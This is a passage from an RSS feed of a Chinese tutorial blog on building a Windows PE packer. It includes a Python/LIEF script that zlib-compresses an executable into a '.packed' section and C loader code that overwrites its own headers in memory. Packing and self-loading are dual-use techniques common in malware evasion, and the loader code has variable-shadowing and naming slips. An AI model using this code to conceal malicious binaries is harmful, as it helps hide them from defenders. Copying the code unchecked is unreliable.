&lt;/code>&lt;/pre>&lt;/div>&lt;p>定义 inflate 流：&lt;/p>
&lt;ul>
&lt;li>&lt;code>avail_in&lt;/code> 是可用的输入 buffer 大小&lt;/li>
&lt;li>&lt;code>avail_out&lt;/code> 是可用的输出 buffer 大小&lt;/li>
&lt;li>&lt;code>next_in&lt;/code> 是输入 buffer 的指针&lt;/li>
&lt;li>&lt;code>next_out&lt;/code> 是输出 buffer 的指针&lt;/li>
&lt;li>&lt;code>zalloc&lt;/code>、&lt;code>zfree&lt;/code>、&lt;code>opaque&lt;/code> 初始化成 NULL&lt;/li>
&lt;/ul>
&lt;p>使用 &lt;code>inflateInit()&lt;/code> 初始化流，然后调用 &lt;code>inflate()&lt;/code> 解压。&lt;code>inflate()&lt;/code> 会返回错误码，如果长度正好，会返回 &lt;code>Z_STREAM_END&lt;/code>。如果输出 buffer 长度不足，但解压成功，会返回 &lt;code>Z_OK&lt;/code>。其他情况会返回错误码。因为这里很清楚给定的压缩前长度，解压必定返回 &lt;code>Z_STREAM_END&lt;/code>，其他情况都有问题，所以只做了一个判断。&lt;/p>
&lt;p>对于其他情况，错误码可以用 &lt;code>zError&lt;/code> 获取错误描述。&lt;/p>
&lt;p>解压结束后要使用 &lt;code>inflateEnd()&lt;/code> 关闭流。&lt;/p>
&lt;h2 id="0x02-zlib压缩">0x02 zlib压缩&lt;/h2>
&lt;p>因为使用 python 写加壳机，就不用这么麻烦了。&lt;/p>
&lt;p>在处理 &lt;code>.packed&lt;/code> 节的时候，使用 &lt;code>struct&lt;/code> 和 &lt;code>zlib&lt;/code> 两个 python 自带的库就能完成压缩和填充头。&lt;/p>
&lt;p>在脚本头部添加两句 &lt;code>import&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">import&lt;/span> &lt;span class="nn">struct&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="nn">zlib&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后修改加壳代码中，添加 &lt;code>.packed&lt;/code> 节的代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="c1"># add packed section&lt;/span>
&lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;example.exe&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;rb&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">file_content&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="n">origin_length&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">file_content&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">compressed&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">zlib&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">compress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">file_content&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">9&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">compressed_length&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">compressed&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">section_content&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">struct&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;II&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">compressed_length&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">origin_length&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">section_content&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">compressed&lt;/span>
&lt;span class="n">packed_section&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Section&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;.packed&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">packed_section&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">content&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">list&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">section_content&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">packed_section&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">characteristics&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SECTION_CHARACTERISTICS&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">MEM_READ&lt;/span> &lt;span class="o">|&lt;/span>
&lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SECTION_CHARACTERISTICS&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">CNT_INITIALIZED_DATA&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">add_section&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">packed_section&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到使用 &lt;code>zlib.compress&lt;/code> 就完成了压缩，不用原始 zlib 流那么麻烦。&lt;/p>
&lt;p>&lt;code>struct.pack&lt;/code> 指定了小端序，两个4字节int，分别填写压缩后大小和原始大小，连接压缩后的数据，填充进&lt;code>.packed&lt;/code> 节。&lt;/p>
&lt;p>就这样，压缩功能成功完成。&lt;/p>
&lt;h2 id="0x03-成果展示">0x03 成果展示&lt;/h2>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-04-zlib-compression-packer-demo/compression-packer.gif"
width="961"
height="548"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-04-zlib-compression-packer-demo/compression-packer_hu48b8d61b8280e2749c0709493a3ebc66_545730_480x0_resize_box.gif 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-04-zlib-compression-packer-demo/compression-packer_hu48b8d61b8280e2749c0709493a3ebc66_545730_1024x0_resize_box.gif 1024w"
loading="lazy"
alt="compression-packer"
class="gallery-image"
data-flex-grow="175"
data-flex-basis="420px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-04-zlib-compression-packer-demo/image-20211020154513713.png"
width="612"
height="124"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-04-zlib-compression-packer-demo/image-20211020154513713_hu9ea9ff8b4b10d51b1ae7242496aa71bc_14861_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-04-zlib-compression-packer-demo/image-20211020154513713_hu9ea9ff8b4b10d51b1ae7242496aa71bc_14861_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211020154513713"
class="gallery-image"
data-flex-grow="493"
data-flex-basis="1184px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-04-zlib-compression-packer-demo/image-20211020154539546.png"
width="512"
height="282"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-04-zlib-compression-packer-demo/image-20211020154539546_hu04f79f6a0431df840a4406ea20a286f1_11213_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-04-zlib-compression-packer-demo/image-20211020154539546_hu04f79f6a0431df840a4406ea20a286f1_11213_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211020154539546"
class="gallery-image"
data-flex-grow="181"
data-flex-basis="435px"
>&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>偷懒了，用了一些 msvcrt 的函数，比如 malloc，要加个 &lt;code>-lmsvcrt&lt;/code> 链接选项。最终成品压缩率还可以，从107KB 压缩到了 49KB，zlib 不负期望。&lt;/p>
&lt;p>写好壳程序之后，不管是加密还是压缩都是很容易的事情（指单纯做个简单实现），但问题依然存在：&lt;/p>
&lt;ul>
&lt;li>64位程序——我觉得可以以后再说吧？我连64位汇编都还不会（泪）。&lt;/li>
&lt;li>脱壳跟玩一样——现在看 .packed 已经没有 MZ 这个摆明了是原始程序的标志了，但并没有卵用。壳程序也没混淆和反调试，节表也是清晰可见，根本不用分析。&lt;/li>
&lt;/ul>
&lt;p>下一篇还没想好做什么，得先继续学习充实下自己，找个方向。&lt;/p></description></item><item><title>加壳原理03 - 支持没有重定位的程序</title><link>https://nnnewb.github.io/blog/p/learning-packer-03-support-no-relocations/</link><pubDate>Wed, 20 Oct 2021 10:25:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/learning-packer-03-support-no-relocations/</guid><description>&lt;img src="https://nnnewb.github.io/blog/p/learning-packer-03-support-no-relocations/cover.jpg" alt="Featured image of post 加壳原理03 - 支持没有重定位的程序" />&lt;h2 id="前言">前言&lt;/h2>
&lt;p>距离上一篇加壳原理已经过去挺久了，这段时间稍微折腾了一下 nasm，尝试手工制作了 PE32 文件，积累了一些基本的知识吧。&lt;/p>
&lt;p>所以现在继续学习加壳——如何对不支持 ASLR 的 PE32 程序进行加壳？&lt;/p>
&lt;h2 id="0x01-关于aslr">0x01 关于ASLR&lt;/h2>
&lt;p>ASLR是一项内存保护技术，用于防范内存损坏漏洞，比如缓冲区溢出。需要注意的是 ASLR 并不是 &lt;em>解决&lt;/em> 了相关威胁，而是让利用相关的漏洞变得更加困难和具有挑战性。&lt;/p>
&lt;p>ASLR 的全名是 &lt;em>Address Space Layout Randomization&lt;/em> ，地址空间布局随机化技术。一个典型的 PE32 程序在没有 ASLR 支持的情况下， 地址空间布局是确定的：程序镜像总会加载到固定的地址。这个地址会在文件头里指定。攻击者可以利用这一特点来构造恶意数据，让存在内存损坏漏洞的程序按攻击者意图跳过或执行特定逻辑，造成安全威胁。&lt;/p>
&lt;p>对应 ASLR 的地址空间布局随机化，程序需要再次编译来支持重定位 &lt;em>Relocation&lt;/em> ，别无他法（大概）。&lt;/p>
&lt;h2 id="0x02-思路">0x02 思路&lt;/h2>
&lt;p>对于加壳一个没有重定位，不支持 ASLR 的 PE32 程序，假设这个程序的基址是 &lt;code>0x04000000&lt;/code>，原先的 &lt;code>VirtualAlloc&lt;/code> 方式分配内存是行不通的。加壳后程序若开启 ASLR，则 &lt;code>0x04000000&lt;/code> 可能已经存在其他模块，并不能保证这个基址可用。&lt;strong>所以加壳后的程序必须也使用 &lt;code>0x04000000&lt;/code> 这个基址，而且标记为不支持 ASLR&lt;/strong>，避免基址已经被其他模块使用造成加载器无法工作。&lt;/p>
&lt;p>将加壳后程序的基址设置为固定的 &lt;code>0x04000000&lt;/code> 又会产生新的问题：加载器的代码段不能放在 &lt;code>0x04000000&lt;/code> ，否则加载器运行时就会出现被被加载的代码覆盖的情况，导致程序跑飞。所以&lt;strong>编译后的加载器所有 Section 都必须有一定的偏移，这个偏移值就是被加载程序的 Section 大小之和（对齐后）&lt;/strong>。而因此多出来的空间单独分成一个 Section ，正好用来放要加载的程序。&lt;/p>
&lt;p>另外，还必须确认文件头大小是否一致，因为&lt;strong>我们需要将被加载程序的文件头覆盖加载器的文件头&lt;/strong>。而&lt;strong>最开始预留的空间必须分配为一个 Section&lt;/strong>，让 Windows 的加载器能顺利加载程序而不报“不是有效的Win32程序”错误。&lt;/p>
&lt;p>内存布局示意图如下：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-03-support-no-relocations/%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80.png"
width="1155"
height="145"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-03-support-no-relocations/%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80_hu26017091af2f4be7bf70029e5d75a3ba_13811_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-03-support-no-relocations/%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80_hu26017091af2f4be7bf70029e5d75a3ba_13811_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="内存布局"
class="gallery-image"
data-flex-grow="796"
data-flex-basis="1911px"
>&lt;/p>
&lt;p>所以加载器的加载步骤如下：&lt;/p>
&lt;ol>
&lt;li>寻找被加载的 Section 。&lt;/li>
&lt;li>复制文件头覆盖自己的文件头。&lt;/li>
&lt;li>以自己的基址为被加载程序的基址，完成加载。&lt;/li>
&lt;/ol>
&lt;p>加壳机的加壳步骤如下：&lt;/p>
&lt;ol>
&lt;li>解析被加壳程序，获取 Section 大小、文件头大小、对齐大小等信息。&lt;/li>
&lt;li>生成加载器程序，根据上一步取得的数据计算出加载器 Section 的偏移和对齐。&lt;/li>
&lt;li>合并被加壳程序和加载器，生成被加壳程序。&lt;/li>
&lt;/ol>
&lt;p>案例程序如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;Windows.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Hello world!&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;MSGBOX&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="0x03-加载器修改">0x03 加载器修改&lt;/h2>
&lt;p>加载器需要把 &lt;code>VirtualAlloc&lt;/code> 改成 &lt;code>GetModuleHandleA&lt;/code>，并解除当前程序文件头的写保护，并在随后的复制 Section 阶段同样用 &lt;code>VirtualProtect&lt;/code> 解除写保护，添加执行权限。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nf">load_PE&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">PE_data&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">IMAGE_DOS_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_DOS_header&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_DOS_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">PE_data&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_NT_headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">PE_data&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p_DOS_header&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">e_lfanew&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// extract information from PE header
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">size_of_image&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">SizeOfImage&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">entry_point_RVA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">AddressOfEntryPoint&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">size_of_headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">SizeOfHeaders&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// base address
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">GetModuleHandleA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// make sure we can write in allocated memory
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">oldProtect&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">VirtualProtect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">SizeOfHeaders&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_READWRITE&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">oldProtect&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// copy PE headers in memory
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">mymemcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PE_data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_of_headers&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Section headers starts right after the IMAGE_NT_HEADERS struct, so we do some pointer arithmetic-fu here.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_SECTION_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">sections&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_SECTION_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_NT_headers&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">FileHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">NumberOfSections&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// calculate the VA we need to copy the content, from the RVA
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// section[i].VirtualAddress is a RVA, mind it
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">dest&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// check if there is Raw data to copy
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">SizeOfRawData&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// make sure we can write in allocated sections
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">VirtualProtect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">SizeOfRawData&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_READWRITE&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">old_protect&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// We copy SizeOfRaw data bytes, from the offset PointerToRawData in the file
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">mymemcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PE_data&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">PointerToRawData&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">SizeOfRawData&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">VirtualProtect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">Misc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">VirtualSize&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_READWRITE&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">old_protect&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">size_t&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">Misc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">VirtualSize&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">dest&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// ...
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>此外还有一个坑：不知道为啥，我用 lief python 生成的 DataDirectories 实际只有15个元素（包括最后一个 null 元素），但 &lt;code>winnt.h&lt;/code> 里定义的 DataDirectories 是固定长度 16 个元素，所以直接算 &lt;code>p_NT_header + 1&lt;/code> 得到的偏移值会比预期的大 8 个字节，导致报找不到 &lt;code>.packed&lt;/code> 。&lt;/p>
&lt;p>改成这样。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">int&lt;/span> &lt;span class="nf">_start&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">unpacker_VA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">GetModuleHandleA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">IMAGE_DOS_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_DOS_header&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">PIMAGE_DOS_HEADER&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">unpacker_VA&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_NT_headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">PIMAGE_NT_HEADERS&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">unpacker_VA&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p_DOS_header&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">e_lfanew&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">IMAGE_SECTION_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">sections&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">PIMAGE_SECTION_HEADER&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_NT_headers&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 注意看这里再计算了一次偏移
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">sections&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">PIMAGE_SECTION_HEADER&lt;/span>&lt;span class="p">)((&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">sections&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_NUMBEROF_DIRECTORY_ENTRIES&lt;/span> &lt;span class="o">-&lt;/span>
&lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">NumberOfRvaAndSizes&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span>
&lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_DATA_DIRECTORY&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="0x04-加壳器">0x04 加壳器&lt;/h2>
&lt;p>加壳器这次用 python 写，MinGW 下又要重新编译 LIEF 太折磨人了。&lt;/p>
&lt;h3 id="41-工具函数">4.1 工具函数&lt;/h3>
&lt;p>先是导入和定义必要的工具。&lt;/p>
